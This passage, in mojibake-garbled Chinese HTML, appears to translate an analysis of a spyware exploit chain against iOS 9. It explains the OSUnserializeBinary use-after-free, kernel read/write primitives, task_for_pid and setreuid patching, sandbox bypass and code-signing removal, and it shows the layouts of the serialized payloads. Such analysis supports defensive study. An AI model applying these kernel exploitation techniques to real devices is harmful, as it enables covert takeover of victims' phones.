å…¶å¼•ç”¨è®¡æ•°ã€‚æ­¤æ–¹æ³•çš„é—®é¢˜åœ¨äºï¼Œå½“ç¬¬äºŒä¸ªå¯¹è±¡æ›¿æ¢ç°æœ‰å¯¹è±¡æ—¶ï¼ˆåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œå°±æ˜¯æ¯å½“å­—ç¬¦ä¸²å¯¹è±¡æ›¿æ¢KEY1çš„æ•°å­—å¯¹è±¡æ—¶ï¼‰ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡è¢«é‡Šæ”¾å¹¶éšåè¢«é‡Šæ”¾ï¼Œä½†æ˜¯æŒ‡å‘ç°åœ¨é‡Šæ”¾çš„å¯¹è±¡çš„æŒ‡é’ˆå­˜åœ¨äºobjsArrayä¸­ã€‚é€šå¸¸è¿™åªæ˜¯ä¸€ä¸ªç³Ÿç³•çš„ç¼–ç¨‹è®¾è®¡é—®é¢˜ï¼Œä½†å¦‚æœé€šè¿‡kOSSerializeObjectæ¡ç›®å¼•ç”¨è¯¥å¯¹è±¡ï¼Œåˆ™é—®é¢˜ä¼šå˜å¾—æ›´åŠ å¤æ‚ã€‚å¦‚æœkOSSerializeObjectæ¡ç›®é€šè¿‡ç´¢å¼•å¼•ç”¨å·²é‡Šæ”¾å¯¹è±¡çš„æŒ‡é’ˆï¼Œåˆ™å¯¹o-&gt; retainï¼ˆï¼‰çš„è°ƒç”¨å°†å°è¯•æ‰§è¡Œå—æ”»å‡»è€…æ§åˆ¶çš„è™šå‡½æ•°ã€‚</p><p>ä¸ºäº†åˆ©ç”¨UAFæ¼æ´ï¼Œ32Stage2å¿…é¡»æ§åˆ¶å·²è§£é™¤åˆ†é…çš„å†…å­˜ä½ç½®ï¼Œå¹¶æ”¾ç½®ä¸€ä¸ªè‡ªå®šä¹‰vtableï¼Œå®ƒå°†ä½¿retainæ¡ç›®æŒ‡å‘è‡ªå·±é€‰æ‹©çš„å‡½æ•°ã€‚å®‰è£…è‡ªå®šä¹‰vtableéœ€è¦è®¿é—®ä¸¤ä¸ªå·²é‡Šæ”¾çš„ç›¸é‚»å†…å­˜ä½ç½®ã€‚ç”±äºåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ— æ³•ç›´æ¥è¦†ç›–å¯¹è±¡çš„vtableï¼Œé€šè¿‡åˆ†é…ç„¶åé‡Šæ”¾ä¸¤ä¸ªå†…å­˜ä½ç½®ï¼Œ32Stage2å¯ä»¥ä½¿ç”¨OSDataæˆ–OSStringå¯¹è±¡ä¸€æ¬¡æ›¿æ¢ä¸¤ä¸ªå†…å­˜ä½ç½®ï¼Œå…¶ä¸­ä¸€ä¸ªå†…å­˜ä½ç½®åŒ…å«æ¶æ„vtableã€‚å¯¼è‡´UAFæ¼æ´çš„ä¸Šè¿°æ¡ä»¶æ˜¯CVE-2016-18284çš„ç»“æœï¼Œå¹¶ä¸”å­˜åœ¨äº9.0åˆ°9.3.1çš„iOSç‰ˆæœ¬ä¸­ã€‚32Stage2é€šè¿‡ä½¿ç”¨ä»¥ä¸‹payloadæ¥åˆ©ç”¨æ­¤æ¼æ´ï¼Œä»¥ä¾¿åœ¨iOSæ—¶é’Ÿå¤„ç†ç¨‹åºä¸­å®‰è£…å†…æ ¸è¯»/å†™åŸè¯­ã€‚   </p><pre><code>[0x00] kOSSerailizeBinarySignature[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10[0x08] kOSSerailizeString | 4[0x0C] &quot;sy2&quot;[0x10] kOSSerailizeEndCollecton | kOSSerailizeArray | 0x10[0x14] kOSSerailizeDictionary | 0x10[0x18] kOSSerailizeSymbol | 4[0x1C] &quot;sy1&quot;[0x20] kOSSerailizeData | 0x14[0x24] &quot;ffff\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;[0x38] kOSSerailizeSymbol | 4[0x3C] &quot;sy1&quot;[0x40] kOSSerailizeEndCollecton | kOSSerailizeSymbol | 4[0x44] &quot;sy1&quot;[0x48] kOSSerailizeString | 0x1C[0x4C] {payload buffer}[0x68] kOSSerailizeString | 0x1C[0x6C] {payload buffer}[0x88] kOSSerailizeString | 0x1C[0x8C] {payload buffer}[0xA8] kOSSerailizeEndCollecton | kOSSerailizeObject | 5</code></pre><p>åœ¨payloadä¸­ï¼Œ32Stage2é‡ç”¨sy1å¯†é’¥ä»¥é€šè¿‡UAFæ¼æ´æ¿€æ´»payloadã€‚</p><p>ä»iOSç‰ˆæœ¬9.3.2å¼€å§‹ï¼Œä¿®è¡¥äº†CVE-2016-1828æ¼æ´ï¼Œè¿™è¿«ä½¿éœ€è¦ä¸€ç§ä¸åŒçš„æœºåˆ¶æ¥å®‰è£…å†…æ ¸è¯»/å†™åŸè¯­ã€‚ä½†æ˜¯ï¼ŒOSUnserializeBinaryçš„kOSSerializeObjectä»åŒ…å«UAFæ¼æ´ã€‚</p><p>ç†è§£è¿™ä¸ªæ¦‚å¿µçš„æœ€ç®€å•æ–¹æ³•æ˜¯æŸ¥çœ‹32Stage2ç”Ÿæˆçš„payloadï¼Œä»¥åˆ©ç”¨OSUnserializeBinary UAFæ¼æ´ã€‚</p><p>å¯¹äºiOSç‰ˆæœ¬9.3.2è‡³å°‘9.3.3ï¼Œpayloadé‡‡ç”¨ä»¥ä¸‹å½¢å¼ï¼š</p><pre><code>[0x00] kOSSerailizeBinarySignature[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10[0x08] kOSSerializeString | 4[0x0C] &quot;sy2&quot;[0x10] kOSSerializeData | 0x14[0x14] {payload buffer}[0x28] kOSSerializeEndCollecton | kOSSerializeObject | 1 </code></pre><p>è™½ç„¶åœ¨ç»“æ„ä¸Šå®ƒä»¬çœ‹èµ·æ¥æœ‰äº›ä¸åŒï¼Œä½†æœ€ç»ˆå®ƒä»¬éƒ½åˆ©ç”¨äº†UAFæ¼æ´ã€‚åœ¨iOS 9.3.2åŠæ›´é«˜ç‰ˆæœ¬ä¸­ä½¿ç”¨çš„è¿™ç§æ›´ç®€å•çš„payloadæ˜¯æœ€å®¹æ˜“ç†è§£çš„ã€‚å½“OSUnserializeBinaryå¼€å§‹ååºåˆ—åŒ–payloadçš„è§£æè¿‡ç¨‹æ—¶ï¼Œè¯¥å‡½æ•°å°†åˆ›å»ºä¸€ä¸ªæ–°çš„å­—å…¸å¯¹è±¡ï¼Œåç§»0x04å¤„çš„è¿è¡Œç»“æœã€‚åœ¨è¯å…¸ä¸­æœ‰ä¸¤ä¸ªæ— é”®å¯¹è±¡ã€‚ç¬¬ä¸€ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ª<strong>OSString</strong>å¯¹è±¡ï¼Œå…¶å€¼ä¸º<strong>sy2</strong>ï¼ˆåˆ†åˆ«åœ¨åç§»é‡0x08å’Œ0x0Cä¸­æŒ‡å®šï¼‰ã€‚åœ¨åç§»é‡0x10å¤„æŒ‡å®šå¤§å°ä¸º0x14ï¼ˆ20ï¼‰å­—èŠ‚çš„<strong>OSData</strong>å¯¹è±¡ã€‚OSDataå¯¹è±¡åŒ…å«payloadç¼“å†²åŒºæ•°æ®ç»“æ„ã€‚ç”±äºå¯¹è±¡æ˜¯æ— é”®çš„ï¼ŒOSUnserializeBinaryå°†ç”¨OSDataå¯¹è±¡æ›¿æ¢OSStringå¯¹è±¡ï¼Œä½†å°†æŒ‡é’ˆç•™åœ¨objsArrayä¸­ã€‚ç”±äºOSStringå¯¹è±¡æ²¡æœ‰retainï¼ˆï¼‰è°ƒç”¨ï¼ŒOSStringè¢«é‡Šæ”¾ï¼Œä»è€Œå°†ä¸¤ä¸ªå†…å­˜æ•°ç»„æ”¾å…¥ç©ºé—²åˆ—è¡¨ä¸­ï¼ˆä¸€ä¸ªç”¨äºOSStringå¯¹è±¡æœ¬èº«ï¼Œå¦ä¸€ä¸ªç”¨äºä¸OSStringå¯¹è±¡å…³è”çš„å­—ç¬¦ä¸²ï¼‰ã€‚</p><p>å½“OSUnserializeBinaryè§£ækOSSerializeDataæ—¶ï¼Œå°†åˆ†é…æ–°çš„OSDataå¯¹è±¡ï¼Œä»è€Œä»ç©ºé—²åˆ—è¡¨ä¸­æ¶ˆè€—ä¸€ä¸ªå·²é‡Šæ”¾çš„å†…å­˜ä½ç½®ã€‚å½“ä¸kOSSerializeDataå…³è”çš„æ•°æ®è¢«å¤åˆ¶åˆ°OSDataå¯¹è±¡ä¸­æ—¶ï¼Œå°†ä¸ºæ•°æ®åˆ†é…æ–°çš„ç¼“å†²åŒºï¼Œè¯¥ç¼“å†²åŒºå°†æ¶ˆè€—ç©ºé—²åˆ—è¡¨ä¸­çš„å‰©ä½™æ•°æ®ä½ç½®ã€‚æ­¤æ—¶ï¼ŒobjsArrayä¸­çš„æ‚¬ç©ºæŒ‡é’ˆå·²è¢«OSDataå¯¹è±¡çš„æ•°æ®æ›¿æ¢ã€‚å®ƒæ˜¯ä¸OSDataå¯¹è±¡å…³è”çš„æ•°æ®ï¼Œå…¶ä¸­åŒ…å«æ¶æ„payloadï¼Œæœ€ç»ˆå°†ç»™äºˆ32Stage2å†™è®¿é—®å†…æ ¸æƒé™ï¼Œä»¥ä¾¿å®‰è£…è¯»/å†™åŸè¯­ã€‚</p><p>æ— è®ºiOSç‰ˆæœ¬å¦‚ä½•ï¼Œæ¶æ„payloadéƒ½åŒ…å«ç›¸åŒçš„payloadç¼“å†²åŒºã€‚payloadç¼“å†²åŒºæ˜¯ä¸€ä¸ª20å­—èŠ‚çš„ç»“æ„ï¼Œç”±ä»¥ä¸‹å…ƒç´ ç»„æˆï¼š</p><pre><code>[00] address of uaf_payload_buffer + 8[04] {uninitialized data from stack}[08] address of uaf_payload_buffer[0C] static value of 20[10] address of OSSerializer::serialize</code></pre><p>payloadå¿…é¡»åŒ…å«æŒ‡å‘åç§»é‡0x10å¤„æ–°ä¿ç•™å‡½æ•°çš„æŒ‡é’ˆã€‚32Stage2ä½¿ç”¨OSSerializer :: serializeå‡½æ•°ä½œä¸ºæ›¿æ¢ä¿ç•™ã€‚è¿™ç§è®¾è®¡æ„å‘³ç€payloadçš„å…¶ä½™éƒ¨åˆ†å¿…é¡»æ¨¡æ‹ŸOSSerializerå¯¹è±¡çš„vtableã€‚å¦‚å…ˆå‰åœ¨å·²æ¤å…¥çš„è®¾å¤‡ä¸Šå»ºç«‹è¯»/å†™/æ‰§è¡ŒåŸè¯­æ‰€è¿°ï¼ŒOSSerializer :: serializeå‡½æ•°å°†åœ¨æ‰€æä¾›çš„vtableçš„åç§»0x10å¤„è°ƒç”¨è¯¥å‡½æ•°ï¼ŒåŒæ—¶å°†vtableçš„åç§»0x08å’Œ0x0Cä¼ é€’ç»™è¢«è°ƒç”¨çš„å‡½æ•°ã€‚å‡è®¾åç§»é‡0x10è®¾ç½®ä¸ºOSSerializer :: serializeï¼Œåˆ™ä¼šå†æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œä½†ç¬¬äºŒæ¬¡å°†è°ƒç”¨åç§»é‡0x08æŒ‡å®šçš„vtableã€‚æ­¤è°ƒç”¨ä¼šå¯¼è‡´ä¸€ç³»åˆ—åç»­è°ƒç”¨ï¼Œæœ€ç»ˆå¯¼è‡´è°ƒç”¨ <strong>_copyin</strong>ï¼Œè¿™ä¸ªå‡½æ•°æ›¿æ¢å®æ—¶å’Œç”µæ± æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºï¼Œæ­£å¦‚åœ¨ä¹‹å‰æ¤å…¥çš„è®¾å¤‡ä¸Šå»ºç«‹è¯»/å†™/æ‰§è¡ŒåŸè¯­æ­¥éª¤ä¸­æ‰€è¿°ã€‚</p><p>åœ¨æ‰§è¡Œæ¼æ´åˆ©ç”¨ä¹‹åï¼Œå¦‚æœå—å®³è€…çš„æ‰‹æœºæ˜¯â€œiPhone4,1â€ï¼Œåˆ™æ§åˆ¶ä¹‹å‰ç”Ÿæˆçš„1000ä¸ªçº¿ç¨‹çš„å…¨å±€å˜é‡å€¼å°†è®¾ç½®ä¸º-1ä»¥ç»ˆæ­¢çº¿ç¨‹ã€‚</p><p>ä¸ºéªŒè¯ç”µæ± æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºæ˜¯å¦æˆåŠŸè¯»å–å†…æ ¸å†…å­˜åœ°å€ï¼Œå°†è°ƒç”¨<em>clock_get _attributes</em>ï¼Œå¹¶å°†è¯»å–ä½ç½®æŒ‡å®šä¸ºå†…æ ¸çš„åŸºå€ã€‚å¦‚æœ<em>clock_get _attributes</em>çš„ç»“æœä¸æ˜¯é­”æœ¯å€¼<code>0xFEEDFACE</code>ï¼Œåˆ™å†æ¬¡å°è¯•ã€‚ ç¬¬äºŒæ¬¡å¤±è´¥å¯¼è‡´è°ƒç”¨assertå›è°ƒå¹¶ç»ˆæ­¢32Stage2ã€‚</p><h4 id="å»ºç«‹å†…æ ¸è¯»-å†™åŸºå…ƒï¼ˆ64ä½ï¼‰"><a href="#å»ºç«‹å†…æ ¸è¯»-å†™åŸºå…ƒï¼ˆ64ä½ï¼‰" class="headerlink" title="å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ64ä½ï¼‰"></a>å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ64ä½ï¼‰</h4><p>åœ¨ç¬¬äºŒé˜¶æ®µçš„64ä½ç‰ˆæœ¬ä¸­åˆ©ç”¨äº†ç›¸åŒçš„åº•å±‚æ¼æ´ã€‚åŸåˆ™ä¸Šï¼Œæ¼æ´åˆ©ç”¨çš„ç»“æ„éå¸¸ç±»ä¼¼ã€‚ä¸»è¦åŒºåˆ«åœ¨äºé€šè¿‡å†™å…¥<strong>net.inet.ip.dummynet.extract _ heap</strong> sysctlå¤„ç†ç¨‹åºæ¥å»ºç«‹æœ€ç»ˆçš„æ‰§è¡ŒåŸè¯­ã€‚OSSerializer :: serializeçš„ä½¿ç”¨æ–¹å¼ä¸32Stage2ä¸­çš„ç±»ä¼¼ã€‚ç„¶åä½¿ç”¨åœ¨å»ºç«‹å†…æ ¸æ‰§è¡ŒåŸè¯­ï¼ˆ32ä½ï¼‰ä¸­æè¿°çš„ç›¸åŒæœºåˆ¶æ¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼ˆé€šè¿‡æ‰§è¡Œä»»æ„ROPé“¾ï¼‰ã€‚</p><h4 id="å»ºç«‹å†…æ ¸æ‰§è¡ŒåŸè¯­ï¼ˆ32ä½ï¼‰"><a href="#å»ºç«‹å†…æ ¸æ‰§è¡ŒåŸè¯­ï¼ˆ32ä½ï¼‰" class="headerlink" title="å»ºç«‹å†…æ ¸æ‰§è¡ŒåŸè¯­ï¼ˆ32ä½ï¼‰"></a>å»ºç«‹å†…æ ¸æ‰§è¡ŒåŸè¯­ï¼ˆ32ä½ï¼‰</h4><p>æ­£å¦‚ä¹‹å‰åœ¨Rooted Devicesä¸Šå®‰è£…å†…æ ¸è®¿é—®å¤„ç†ç¨‹åºä¸­æ‰€è§£é‡Šçš„é‚£æ ·ï¼Œå®æ—¶æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºæŒ‡å‘OSSerializer :: serializeï¼Œå®ƒå…è®¸clock_get_attributesçš„è°ƒç”¨è€…å°†ç‰¹åˆ¶ç»“æ„ä¼ é€’ç»™OSSerializer :: serializeä»¥ä¾¿åœ¨å†…æ ¸ç©ºé—´ä¸­æ‰§è¡ŒæŒ‡ä»¤ã€‚è¦åœ¨å†…æ ¸ç©ºé—´å†…æ‰§è¡Œï¼Œç”¨æˆ·åŒº32Stage2è¿›ç¨‹å¿…é¡»å…·æœ‰ä»¥å¯é çš„æ–¹å¼å°†æ•°æ®ä¼ è¾“åˆ°å†…æ ¸åœ°å€ç©ºé—´çš„æ–¹æ³•ã€‚ 32Stage2ä½¿ç”¨ç®¡é“åˆ›å»ºçš„ç®¡é“é›†çš„æ–¹æ³•æ¥å®Œæˆæ­¤ä»»åŠ¡ã€‚</p><p>åœ¨å°†ç”µæ± æ—¶é’Ÿçš„æ–°getattrå¤„ç†ç¨‹åºå»ºç«‹ä¸º<em> _bufattr _cpx</em> ä¹‹åï¼Œ32Stage2æœ‰ä¸€ä¸ªå¯é çš„æ–¹æ³•å°†DWORDä»å†…æ ¸åœ°å€ç©ºé—´è¯»å…¥ç”¨æˆ·ç©ºé—´ã€‚32Stage2ä½¿ç”¨æ­¤åŠŸèƒ½æ¥æŸ¥æ‰¾å­˜å‚¨åœ¨å†…æ ¸ä¸­çš„<strong>addrperm</strong>å€¼ã€‚addrpermé‡æ–°å®šä¹‰æ•°æ®ä¼ å…¥ç”¨æˆ·åŒºæ—¶åœ¨å†…æ ¸ä¸­çš„åç§»é‡ï¼Œä»¥ä¾¿æ··æ·†å†…æ ¸ä¸­æ•°æ®çš„çœŸå®ä½ç½®ã€‚å¦‚æœè·å¾—è¯¥å€¼ï¼Œå¯ä»¥å°†å†…æ ¸åœ°å€åæ··æ·†åˆ°å…¶çœŸå®åœ°å€å€¼ã€‚32Stage2ä»ç”Ÿæˆçš„ç®¡é“é›†ä¸­è°ƒç”¨è¯»å–ç®¡é“çš„<strong>fstat</strong>ï¼Œç„¶åè®¡ç®—<strong>stat</strong>ç»“æ„çš„ä½ç½®ä¸å†…æ ¸åœ°å€ç©ºé—´ä¹‹é—´çš„å·®å¼‚ã€‚ç„¶åå°†è¯¥å€¼å­˜å‚¨åœ¨å…¨å±€å˜é‡ä¸­ï¼Œä¾›å¿…é¡»è®¿é—®å†…æ ¸å†…å­˜ä»¥æ‰§è¡Œä»£ç çš„å‡½æ•°ä½¿ç”¨ã€‚</p><p>æ¯å½“32Stage2æƒ³è¦åœ¨å†…æ ¸ä¸­æ‰§è¡Œä»£ç æ—¶ï¼Œä»¥ä¸‹æ•°æ®ç»“æ„å°†å†™å…¥ç”Ÿæˆçš„ç®¡é“é›†ä¸­write pipeï¼š</p><pre><code>[00] argument 1[04] argument 2[08] address of cpde execute</code></pre><p>ä¸ºäº†è°ƒç”¨æ•°æ®åç§»é‡8ä¸­æŒ‡å®šçš„å‡½æ•°ï¼Œå¦ä¸€ä¸ªDWORDè¢«é¢„å…ˆæ·»åŠ åˆ°æ•°æ®ä¸­å¹¶ä¼ é€’ç»™å®æ—¶æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºï¼ˆé€šè¿‡OSSerializer :: serializeè®¿é—®ï¼‰ï¼Œå®ƒåœ¨è°ƒç”¨è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€ä¹‹å‰å°†å‚æ•°1æ”¾å…¥R3å’Œå‚æ•°2æ”¾å…¥R1ã€‚é€šè¿‡å°†æœªä½¿ç”¨çš„DWORDæ·»åŠ åˆ°æ•°æ®ç»“æ„ä¸­ï¼Œè¯¥æ•°æ®å—æˆä¸ºOSSerializerçš„vtableæ›¿ä»£å“ã€‚è¯¥æŠ€æœ¯ç”¨äº32Stage2ä¸­çš„ä¸¤ä¸ªä¸åŒå‡½æ•°ã€‚ ä¸€ä¸ªå‡½æ•°å…è®¸ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ï¼Œå¦ä¸€ä¸ªå‡½æ•°ç”¨äºå°†DWORDå€¼å†™å…¥å†…æ ¸åœ°å€ç©ºé—´ã€‚</p><h4 id="ä¿®è¡¥å†…æ ¸ä»¥å…è®¸å†…æ ¸ç«¯å£è®¿é—®"><a href="#ä¿®è¡¥å†…æ ¸ä»¥å…è®¸å†…æ ¸ç«¯å£è®¿é—®" class="headerlink" title="ä¿®è¡¥å†…æ ¸ä»¥å…è®¸å†…æ ¸ç«¯å£è®¿é—®"></a>ä¿®è¡¥å†…æ ¸ä»¥å…è®¸å†…æ ¸ç«¯å£è®¿é—®</h4><p>ç”±äºèƒ½å¤Ÿåœ¨å†…æ ¸åœ°å€ç©ºé—´å†…è¯»å–ï¼Œå†™å…¥å’Œæ‰§è¡Œä»»æ„ä½ç½®ï¼Œä¸‹ä¸€æ­¥æ˜¯é€šè¿‡å†…æ ¸ç«¯å£è·å¾—å¯¹å†…æ ¸çš„æ›´ç›´æ¥è®¿é—®ã€‚å¦‚æœä½¿ç”¨PIDå€¼0è°ƒç”¨ï¼Œåˆ™ <strong>  _for_pid </strong> ä¼šè¿”å›é”™è¯¯ã€‚ä¸ºäº†ç»•è¿‡è¿™ç§ä¿æŠ¤ï¼Œç¬¬2é˜¶æ®µä¿®æ”¹äº†<strong>task_for_pid</strong>ä¸­çš„å››ä¸ªä¸åŒä½ç½®ã€‚åœ¨å¼€å§‹ä¿®æ”¹<strong>task_for_pid</strong>ä¹‹å‰ï¼Œé˜¶æ®µ2ç¡®å®šéœ€è¦ä¿®è¯¥æ”¹çš„åŒºåŸŸæ˜¯å¦åœ¨å¯è¯»å–/æ‰§è¡Œçš„å†…å­˜åŒºåŸŸå†…ã€‚å¦‚æœå†…å­˜ä¸å¯å†™ï¼Œåˆ™ç¬¬2é˜¶æ®µå°†ç›´æ¥ä¿®æ”¹å†…å­˜åŒºåŸŸçš„æƒé™ä»¥å…è®¸å†™è®¿é—®ï¼Œç„¶åä½¿dcacheæ— æ•ˆå¹¶åˆ·æ–°æ•°æ®å’ŒTLBsæŒ‡ä»¤ä»¥ç¡®ä¿å†…å­˜åŒºåŸŸè¿›è¡Œæƒé™æ›´æ–°ã€‚</p><p>ä¿®æ”¹<strong>task_for_pid</strong>ä»¥å…è®¸è°ƒç”¨è€…è·å¾—å†…æ ¸çš„ç«¯å£åï¼Œ åœ¨è°ƒç”¨assertå›è°ƒå’Œé€€å‡ºä¹‹å‰ï¼Œç¬¬2é˜¶æ®µå°†å°è¯•é€šè¿‡è°ƒç”¨<strong>task_for_pidï¼ˆmach_task_selfï¼Œ0ï¼Œï¼†portï¼‰</strong>æ¥è·å–äº”æ¬¡å†…æ ¸ç«¯å£ï¼Œæ¯æ¬¡å°è¯•ä¹‹é—´æœ‰100æ¬¡æ¯«ç§’å»¶è¿Ÿã€‚</p><h2 id="é˜¶æ®µä¸‰ï¼šææƒå’Œå®ç°è¶Šç‹±"><a href="#é˜¶æ®µä¸‰ï¼šææƒå’Œå®ç°è¶Šç‹±" class="headerlink" title="é˜¶æ®µä¸‰ï¼šææƒå’Œå®ç°è¶Šç‹±"></a>é˜¶æ®µä¸‰ï¼šææƒå’Œå®ç°è¶Šç‹±</h2><p>æœ¬èŠ‚ä»‹ç»åœ¨ç¬¬2é˜¶æ®µæ‰§è¡Œçš„æœ€ç»ˆæ­¥éª¤ï¼Œä»¥è·å–iPhoneä¸Šçš„rootè®¿é—®æƒé™ï¼Œç¦ç”¨ä»£ç ç­¾åï¼Œç„¶åå®ç°è¶Šç‹±ã€‚ æ­¤é˜¶æ®µåˆ©ç”¨æœ€ç»ˆçš„Tridentæ¼æ´ï¼Œè¯¥æ¼æ´ä¼šé€ æˆå†…æ ¸å†…å­˜æŸåå¯¼è‡´è¶Šç‹±ï¼ˆCVE-2016-4656ï¼‰ã€‚</p><h3 id="ä¿®æ”¹ç³»ç»Ÿä»¥ææƒ"><a href="#ä¿®æ”¹ç³»ç»Ÿä»¥ææƒ" class="headerlink" title="ä¿®æ”¹ç³»ç»Ÿä»¥ææƒ"></a>ä¿®æ”¹ç³»ç»Ÿä»¥ææƒ</h3><p>32Stage2çš„ä¸‹ä¸€æ­¥æ˜¯åœ¨å—å®³è€…çš„æ‰‹æœºä¸Šè·å¾—rootè®¿é—®æƒé™ã€‚å¦‚æœç¬¬2é˜¶æ®µè¿›ç¨‹æ²¡æœ‰ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œï¼ˆUID = 0ï¼‰ï¼Œåœ¨éè¶Šç‹±æ‰‹æœºä¸Šä¸å¯èƒ½ä»¥rootè¿è¡Œï¼Œç¬¬2é˜¶æ®µä¼šä¿®è¡¥setreuidåŠŸèƒ½è·³è¿‡å¯¹ææƒçš„æ£€æŸ¥ã€‚è‹¥å¯¹setreuidçš„ä¿®æ”¹å®Œæˆï¼Œè¯¥å‡½æ•°æœ€å¤šè¢«è°ƒç”¨äº”æ¬¡ï¼ˆæ¯æ¬¡è°ƒç”¨ä¹‹é—´æœ‰500msçš„å»¶è¿Ÿï¼‰ï¼Œç›´åˆ°setreuidï¼ˆ0,0ï¼‰è¿”å›æˆåŠŸã€‚åœ¨äº”æ¬¡å°è¯•ä¹‹åï¼ˆæˆ–åœ¨æˆåŠŸçš„setreuidè°ƒç”¨ä¹‹åï¼‰ï¼Œä¿®æ”¹åçš„setreuidä¼šç»™å‡ºç›¸åçš„ç»“æœã€‚æœ€åæ£€æŸ¥è¿›ç¨‹çš„ç”¨æˆ·å€¼ï¼ˆUIDï¼‰ä»¥ç¡®ä¿å®ƒç¡®å®æ˜¯rootï¼ˆ0ï¼‰ã€‚ å¦‚æœå‡½æ•°getuidè¿”å›0ä»¥å¤–çš„ä»»ä½•å€¼ï¼Œåˆ™è°ƒç”¨assertå¹¶é€€å‡ºé˜¶æ®µ2ã€‚</p><p>é˜¶æ®µ2é€šè¿‡å®æ—¶æ—¶é’Ÿ<strong>clock_get_attributes</strong>è°ƒç”¨å†…æ ¸å‡½æ•°<strong>kauth_cred_get_with_ref</strong>ï¼Œä»¥ä¾¿æ¥æ”¶ä¸»çº¿ç¨‹çš„å‡­è¯ã€‚åœ¨æ­¤ä¹‹åï¼Œç¬¬2é˜¶æ®µå°†æ‰¾åˆ°mac_policy_listï¼Œå…¶ä¸­åŒ…å«å½“å‰åŠ è½½åˆ°iOSå†…æ ¸ä¸­çš„è®¿é—®æ§åˆ¶ç­–ç•¥æ¨¡å—åˆ—è¡¨ã€‚é˜¶æ®µ2æ£€æŸ¥åˆ—è¡¨ï¼ŒæŸ¥æ‰¾ä»¥åç§°â€œSeatâ€å¼€å¤´çš„æ¨¡å—ï¼Œå¯å‚è€ƒâ€œSeatbeltæ²™ç®±ç­–ç•¥â€ã€‚å¦‚æœæœªæ‰¾åˆ°ç­–ç•¥æ¨¡å—ï¼Œåˆ™é˜¶æ®µ2è°ƒç”¨æ–­è¨€å›è°ƒå¹¶ç»ˆæ­¢ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‰¾åˆ°è¯¥æ¨¡å—ï¼Œåˆ™ä¼šè¯»å–å¹¶ä¿®æ”¹<strong>mpc_field_off</strong>ï¼Œä»¥å…è®¸å½“å‰è¿›ç¨‹æ›´å¤§ç¨‹åº¦åœ°æ§åˆ¶å—å®³è€…çš„iPhoneã€‚</p><p>å› ä¸ºå¯è®¿é—®å†…æ ¸ç«¯å£å¹¶ä¸”åˆ é™¤äº†å°†é˜»æ­¢ç¬¬2é˜¶æ®µæ‰§è¡Œé€šå¸¸è¢«æ²™ç®±ç­–ç•¥é˜»æ­¢çš„æƒé™æ“ä½œçš„é™åˆ¶ï¼Œé˜¶æ®µ2ä¸å†éœ€è¦å®æ—¶æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºã€‚ä¸ºäº†ç¡®ä¿å°†æ¥å¯¹æ­¤å¤„ç†ç¨‹åºçš„è°ƒç”¨ä¸ä¼šä½¿æ‰‹æœºå´©æºƒï¼Œå°†ä¿®æ”¹getattrå‡½æ•°æŒ‡é’ˆä»¥æŒ‡å‘æŒ‡ä»¤ï¼š<br><code>BX LR</code><br>è¿™ä¸ªæ–°çš„å¤„ç†å‡½æ•°æœ‰æ•ˆåœ°å°†æœªæ¥å¯¹å®æ—¶æ—¶é’Ÿçš„getattrè°ƒç”¨è½¬æ¢ä¸ºNOPã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç¡®ä¿å°†æ¥è°ƒç”¨getattrå¤„ç†ç¨‹åºï¼ˆé€šè¿‡æŸäº›å…¶ä»–è¿›ç¨‹ï¼‰ä¸ä¼šäº§ç”Ÿæ„å¤–åæœå¹¶å¯¼è‡´å†…æ ¸å´©æºƒã€‚</p><h3 id="ç¦ç”¨ä»£ç ç­¾å"><a href="#ç¦ç”¨ä»£ç ç­¾å" class="headerlink" title="ç¦ç”¨ä»£ç ç­¾å"></a>ç¦ç”¨ä»£ç ç­¾å</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ ‡å‡†iPhoneä¸Šçš„iOSå°†é˜»æ­¢æœªç­¾åçš„ä»£ç é€šè¿‡æ­£å¸¸æ–¹å¼è¿è¡Œï¼Œä¾‹å¦‚<code>execv</code>æˆ–ç³»ç»Ÿè°ƒç”¨ã€‚åŒæ ·ï¼Œé€šè¿‡å°†æ–‡ä»¶ç³»ç»Ÿè®¾ç½®ä¸ºåªè¯»ï¼Œå¯ä»¥é˜²æ­¢å¯¹æ ¹æ–‡ä»¶ç³»ç»Ÿçš„ä¿®æ”¹ã€‚è¿™äº›æƒ…å†µå°†é˜»æ­¢ç¬¬2é˜¶æ®µæ‰§è¡Œè¶Šç‹±ç¨‹åºï¼Œå¹¶å°†é˜»æ­¢è¶Šç‹±ç¨‹åºï¼ˆå¦‚æœå®ƒæ¿€æ´»ï¼‰ä¿®æ”¹ç³»ç»Ÿã€‚ç¬¬2é˜¶æ®µä¿®æ”¹äº†å‡ ä¸ªå†…æ ¸å‡½æ•°å’Œä¸¤ä¸ªå†…æ ¸æ‰©å±•ï¼ˆkextï¼‰ï¼Œä»¥å…è®¸è¿™äº›ç¦æ­¢çš„æ“ä½œã€‚ç¬¬2é˜¶æ®µé¦–å…ˆæ‰¾åˆ°<code>com.apple.driver.AppleMobileFileIntegrity</code>å’Œ<code>com.apple.driver.LightweightVolumeManager</code>çš„kextã€‚<code>com.apple.driver.AppleMobileFileIntegrity</code>ï¼ˆAMFIï¼‰æ‰©å±•ç¨‹åºè´Ÿè´£å®æ–½iOSçš„ä»£ç 